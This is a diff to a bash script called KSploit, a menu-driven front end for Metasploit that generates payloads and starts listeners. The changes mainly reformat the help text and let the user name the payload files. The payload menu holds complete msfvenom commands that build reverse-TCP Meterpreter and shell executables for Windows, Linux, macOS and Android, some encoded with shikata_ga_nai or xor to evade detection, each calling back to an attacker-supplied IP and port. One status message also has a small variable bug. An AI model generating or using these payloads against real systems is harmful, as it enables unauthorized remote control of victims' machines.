@@ -55,18 +55,18 @@ Help()
    echo "       ${GREEN}   🕵🔎 By KaotickJ 👽 " 
    #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
    echo 
-   echo "${BLUE}KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits."
+   echo " ${BLUE}KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits."
    echo
-   echo "${LIGHT_MAGENTA}Syntax: ksploit.sh [-h|-l|-s|-m|-p|-x]"
+   echo " ${LIGHT_MAGENTA}Syntax: ksploit.sh [-h|-l|-s|-m|-p|-x]"
    echo ${GREEN}
-   echo "options:"
-   echo "-------------------------------------------"
-   echo "${YELLOW}-h ${BLUE}To show this message"
-   echo "${YELLOW}-l ${BLUE}To load the listeners menu."
-   echo "${YELLOW}-S ${BLUE}To load the shells menu"
-   echo "${YELLOW}-m ${BLUE}To start Msfconsole"
-   echo "${YELLOW}-p ${BLUE}To load the payloads menu."
-   echo "${YELLOW}-x ${BLUE}To load the persistence menu."
+   echo " options:"
+   echo " -------------------------------------------"
+   echo " ${YELLOW}-h ${BLUE}To show this message"
+   echo " ${YELLOW}-l ${BLUE}To load the listeners menu."
+   echo " ${YELLOW}-S ${BLUE}To load the shells menu"
+   echo " ${YELLOW}-m ${BLUE}To start Msfconsole"
+   echo " ${YELLOW}-p ${BLUE}To load the payloads menu."
+   echo " ${YELLOW}-x ${BLUE}To load the persistence menu."
    echo 
    echo 
 }
@@ -191,38 +191,38 @@ payloads()
         echo ${LIGHT_MAGENTA}
 	PS3="${YELLOW}Enter your choice (9=QUIT)" 
 
-	options=("Windows_x86" "Windows_x64" "Linux" " Mac" " Android" "Python" "Meterpreter_x86" "Meterpreter_x64" "Quit")
+	options=("Windows_x86" "Windows_x64" "Linux" "Mac" "Android" "Python" "Meterpreter_x86" "Meterpreter_x64" "Quit")
 	select opt in "${options[@]}"
 	do
 	    case $opt in
 		"Windows_x86")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > shell.exe
+		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport; read -p 'Set exe filename (omitting the .exe)* ' exename
+		    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > $exename.exe
 		    echo "Generating payload ....."	
-		    echo -e "${DG} - - - -> shell.exe saved ${GREEN}"
+		    echo -e "${DG} - - - -> exename.exe saved ${GREEN}"
 		    ;;
 		"Windows_x64")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x64/xor -i 10 -f exe > shell.exe
+		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport; read -p 'Set exe filename (omitting the .exe)* ' exename
+		    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x64/xor -i 10 -f exe > $exename.exe
 		    echo "Generating payload ....."	
-		    echo -e "${DG} - - - -> shell.exe saved ${GREEN}"
+		    echo -e "${DG} - - - -> $exename.exe saved ${GREEN}"
 		    ;;
 		"Linux")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > shell.elf
-		    echo -e "${DG} - - - -> shell.elf saved ${GREEN}"
+		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport; read -p 'Set elf filename (omitting the .elf)* ' elfname
+		    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $elfname.elf
+		    echo -e "${DG} - - - -> $elfname.elf saved ${GREEN}"
 		    ;;
 		"Mac")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f macho > shell.macho
+		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport; read -p 'Set .macho filename (omitting the .macho)* ' machoname
+		    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f macho > $machoname.macho
 		    echo "Generating payload ....."	
-		    echo -e "${DG} - - - -> shell.macho saved ${GREEN}"
+		    echo -e "${DG} - - - -> $machoname.macho saved ${GREEN}"
 		    ;;
 		"Android")
-		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-		    msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R > ~/Desktop/tmp/shell.apk
+		    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport; read -p 'Set apk filename (omitting the .elf)* ' apkname
+		    msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f raw > $apkname.apk
 		    echo "Generating payload ....."	
-		    echo -e "${DG} - - - -> shell.apk saved ${GREEN}"
+		    echo -e "${DG} - - - -> $apkname.apk saved ${GREEN}"
 		    ;;  
 		"Python")
 		    echo
@@ -374,18 +374,18 @@ clear
    echo "       ${GREEN}   🕵🔎 By KaotickJ 👽 " 
    #	echo "			🖥️ 🐧🍎🤖🐍♻🐚		  "
    echo 
-   echo "${BLUE}KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits."
+   echo " ${BLUE}KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits."
    echo
-   echo "${LIGHT_MAGENTA}Syntax: ksploit.sh [-h|-l|-s|-m|-p|-x]"
+   echo " ${LIGHT_MAGENTA}Syntax: ksploit.sh [-h|-l|-s|-m|-p|-x]"
    echo ${GREEN}
-   echo "options:"
-   echo "-------------------------------------------"
-   echo "${YELLOW}-h ${BLUE}To show this message"
-   echo "${YELLOW}-L ${BLUE}To load the listeners menu."
-   echo "${YELLOW}-S ${BLUE}To load the shells menu"
-   echo "${YELLOW}-m ${BLUE}To start Msfconsole"
-   echo "${YELLOW}-p ${BLUE}To load the payloads menu."
-   echo "${YELLOW}-x ${BLUE}To load the persistence menu."
+   echo " options:"
+   echo " -------------------------------------------"
+   echo " ${YELLOW}-h ${BLUE}To show this message"
+   echo " ${YELLOW}-L ${BLUE}To load the listeners menu."
+   echo " ${YELLOW}-S ${BLUE}To load the shells menu"
+   echo " ${YELLOW}-m ${BLUE}To start Msfconsole"
+   echo " ${YELLOW}-p ${BLUE}To load the payloads menu."
+   echo " ${YELLOW}-x ${BLUE}To load the persistence menu."
    echo 
    echo 
 
